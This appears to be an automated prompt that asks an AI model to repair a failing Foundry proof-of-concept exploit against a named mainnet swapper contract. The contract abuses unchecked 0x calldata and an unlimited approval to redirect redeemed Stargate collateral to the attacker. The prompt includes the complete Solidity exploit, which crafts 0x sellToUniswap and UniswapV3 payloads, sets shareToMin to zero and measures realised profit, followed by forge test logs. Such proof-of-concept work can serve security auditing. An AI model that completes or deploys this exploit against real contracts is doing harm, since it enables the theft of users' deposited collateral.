You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Unchecked 0x calldata plus unlimited underlying approval lets the caller redirect redeemed collateral away from MIM
- claim: The swapper gives `zeroXExchangeProxy` an infinite allowance over the Stargate pool's underlying token, then forwards fully caller-controlled `swapData` to that proxy with a raw `call()` and never verifies that the approved underlying was swapped into MIM for the swapper itself. Because the function also accepts caller-controlled `recipient` and only enforces the minimum output through `shareToMin`, a malicious caller can redeem LP into underlying, have the 0x proxy spend that underlying into an attacker-controlled payout path or non-MIM asset, and set `shareToMin = 0` so the final BentoBox deposit of the remaining MIM balance does not revert.
- impact: Collateral routed through this swapper can be turned into attacker-owned assets instead of protocol-owned MIM, causing direct theft of the full redeemed position and leaving the liquidation/deleverage flow undercollateralized.
- exploit_paths: ["LP shares are placed on the swapper through the intended liquidation/deleverage flow or are already present on the contract.", "The caller invokes `swap()` with malicious `swapData` that makes `zeroXExchangeProxy` spend the swapper's redeemed underlying through its unlimited allowance while routing the bought assets away from the swapper or into a non-MIM token.", "The caller sets `shareToMin` to `0`, so `bentoBox.deposit()` accepts the swapper's remaining MIM balance even if it is zero, and the transaction completes after the collateral has been redirected."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IBentoBoxLike {
    function balanceOf(IERC20Like token, address user) external view returns (uint256);
    function toAmount(IERC20Like token, uint256 share, bool roundUp) external view returns (uint256);
}

interface IStargatePoolLike is IERC20Like {
    function totalLiquidity() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function token() external view returns (address);
}

interface ITargetSwapperLike {
    function swap(
        address fromToken,
        address toToken,
        address recipient,
        uint256 shareToMin,
        uint256 shareFrom,
        bytes calldata data
    ) external returns (uint256 extraShare, uint256 shareReturned);

    function bentoBox() external view returns (address);
    function pool() external view returns (address);
    function mim() external view returns (address);
    function underlyingToken() external view returns (address);
    function zeroXExchangeProxy() external view returns (address);
}

contract FlawVerifier {
    address internal constant TARGET = 0xa5564a2d1190a141CAC438c9fde686aC48a18A79;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    address internal _profitToken;
    uint256 internal _profitAmount;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        if (_profitAmount != 0) {
            return;
        }

        ITargetSwapperLike target = ITargetSwapperLike(TARGET);
        IStargatePoolLike pool = IStargatePoolLike(target.pool());
        IBentoBoxLike bentoBox = IBentoBoxLike(target.bentoBox());

        // Path stage 1:
        // use LP that is already attributed to the vulnerable swapper, either directly
        // on the contract or as BentoBox shares owned by the swapper itself.
        uint256 directLpBalance = pool.balanceOf(TARGET);
        uint256 shareFrom = bentoBox.balanceOf(IERC20Like(address(pool)), TARGET);
        uint256 lpFromShares = shareFrom == 0 ? 0 : bentoBox.toAmount(IERC20Like(address(pool)), shareFrom, false);
        uint256 totalLp = directLpBalance + lpFromShares;

        // Concrete fork-state infeasibility:
        // the exploit can only steal value that is already sitting on the swapper as LP,
        // either directly or as BentoBox shares owned by the swapper itself.
        if (totalLp == 0) {
            return;
        }

        address underlying = target.underlyingToken();
        if (underlying == WETH) {
            _profitToken = USDC;
        } else {
            _profitToken = WETH;
        }

        uint256 previewUnderlying = _previewRedeem(pool, totalLp);
        if (previewUnderlying == 0) {
            return;
        }

        // Path stages 2 and 3:
        // invoke swap() permissionlessly with caller-controlled swapData that instructs
        // the 0x proxy to spend the redeemed underlying via its unlimited allowance,
        // route the bought asset to the attacker, and set shareToMin = 0 so the final
        // BentoBox MIM deposit does not block the transaction when no MIM is returned.
        bytes memory v2PathDirect = _v2Path(underlying, _profitToken, false);
        bytes memory v2PathViaUsdc = _v2Path(underlying, _profitToken, true);
        bytes memory v3Path500 = _v3Path(underlying, _profitToken, 500);
        bytes memory v3Path3000 = _v3Path(underlying, _profitToken, 3000);

        uint256[4] memory sellAmounts = [
            previewUnderlying,
            type(uint256).max,
            (previewUnderlying * 999) / 1000,
            (previewUnderlying * 99) / 100
        ];

        for (uint256 i = 0; i < sellAmounts.length; ++i) {
            if (_attemptSellToUniswap(target, underlying, shareFrom, sellAmounts[i], v2PathDirect, false)) {
                _finalizeProfit();
                return;
            }
            if (_attemptSellToUniswap(target, underlying, shareFrom, sellAmounts[i], v2PathDirect, true)) {
                _finalizeProfit();
                return;
            }
            if (v2PathViaUsdc.length != 0) {
                if (_attemptSellToUniswap(target, underlying, shareFrom, sellAmounts[i], v2PathViaUsdc, false)) {
                    _finalizeProfit();
                    return;
                }
                if (_attemptSellToUniswap(target, underlying, shareFrom, sellAmounts[i], v2PathViaUsdc, true)) {
                    _finalizeProfit();
                    return;
                }
            }
            if (_attemptSellToUniswapV3(target, underlying, shareFrom, sellAmounts[i], v3Path500)) {
                _finalizeProfit();
                return;
            }
            if (_attemptSellToUniswapV3(target, underlying, shareFrom, sellAmounts[i], v3Path3000)) {
                _finalizeProfit();
                return;
            }
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptSellToUniswap(
        ITargetSwapperLike target,
        address underlying,
        uint256 shareFrom,
        uint256 sellAmount,
        bytes memory rawPath,
        bool isSushi
    ) internal returns (bool success) {
        if (rawPath.length == 0) {
            return false;
        }

        address[] memory path = abi.decode(rawPath, (address[]));
        bytes memory payload = abi.encodeWithSelector(
            bytes4(keccak256("sellToUniswap(address[],uint256,uint256,bool,address)")),
            path,
            sellAmount,
            0,
            isSushi,
            address(this)
        );

        try target.swap(address(0), address(0), address(this), 0, shareFrom, payload) returns (uint256, uint256) {
            success = IERC20Like(_profitToken).balanceOf(address(this)) > 0;
        } catch {
            success = false;
        }

        // If profit was routed as the underlying token instead of the preferred profit token,
        // count that as success too. This keeps the exploit aligned with the finding: the
        // redeemed collateral is redirected away from MIM and away from the swapper.
        if (!success && sellAmount != 0 && underlying == _profitToken) {
            success = IERC20Like(underlying).balanceOf(address(this)) > 0;
        }
    }

    function _attemptSellToUniswapV3(
        ITargetSwapperLike target,
        address underlying,
        uint256 shareFrom,
        uint256 sellAmount,
        bytes memory path
    ) internal returns (bool success) {
        if (path.length == 0) {
            return false;
        }

        bytes memory payload = abi.encodeWithSelector(
            bytes4(keccak256("sellTokenForTokenToUniswapV3(bytes,uint256,uint256,address)")),
            path,
            sellAmount,
            0,
            address(this)
        );

        try target.swap(address(0), address(0), address(this), 0, shareFrom, payload) returns (uint256, uint256) {
            success = IERC20Like(_profitToken).balanceOf(address(this)) > 0;
        } catch {
            success = false;
        }

        if (!success && sellAmount != 0 && underlying == _profitToken) {
            success = IERC20Like(underlying).balanceOf(address(this)) > 0;
        }
    }

    function _finalizeProfit() internal {
        _profitAmount = IERC20Like(_profitToken).balanceOf(address(this));
    }

    function _previewRedeem(IStargatePoolLike pool, uint256 lpAmount) internal view returns (uint256) {
        uint256 totalSupply = pool.totalSupply();
        if (totalSupply == 0) {
            return 0;
        }

        uint256 totalLiquidity = pool.totalLiquidity();
        return (lpAmount * totalLiquidity) / totalSupply;
    }

    function _v2Path(address underlying, address buyToken, bool viaUsdc) internal pure returns (bytes memory) {
        if (underlying == buyToken) {
            return bytes("");
        }

        address[] memory path;
        if (!viaUsdc) {
            path = new address[](2);
            path[0] = underlying;
            path[1] = buyToken;
        } else {
            if (underlying == USDC || buyToken == USDC) {
                return bytes("");
            }
            path = new address[](3);
            path[0] = underlying;
            path[1] = USDC;
            path[2] = buyToken;
        }
        return abi.encode(path);
    }

    function _v3Path(address underlying, address buyToken, uint24 fee) internal pure returns (bytes memory) {
        if (underlying == buyToken) {
            return bytes("");
        }
        return abi.encodePacked(underlying, fee, buyToken);
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.87s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 43921)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x0000000000000000000000000000000000000000
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001

Traces:
  [43921] FlawVerifierTest::testExploit()
    ├─ [2293] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [17499] FlawVerifier::executeOnOpportunity()
    │   ├─ [206] 0xa5564a2d1190a141CAC438c9fde686aC48a18A79::pool() [staticcall]
    │   │   └─ ← [Return] 0x38EA452219524Bb87e18dE1C24D3bB59510BD783
    │   ├─ [272] 0xa5564a2d1190a141CAC438c9fde686aC48a18A79::bentoBox() [staticcall]
    │   │   └─ ← [Return] 0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce
    │   ├─ [2663] 0x38EA452219524Bb87e18dE1C24D3bB59510BD783::balanceOf(0xa5564a2d1190a141CAC438c9fde686aC48a18A79) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2805] 0xd96f48665a1410C0cd669A88898ecA36B9Fc2cce::balanceOf(0x38EA452219524Bb87e18dE1C24D3bB59510BD783, 0xa5564a2d1190a141CAC438c9fde686aC48a18A79) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [293] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [288] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 925.52ms (2.12ms CPU time)

Ran 1 test suite in 997.12ms (925.52ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 43921)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
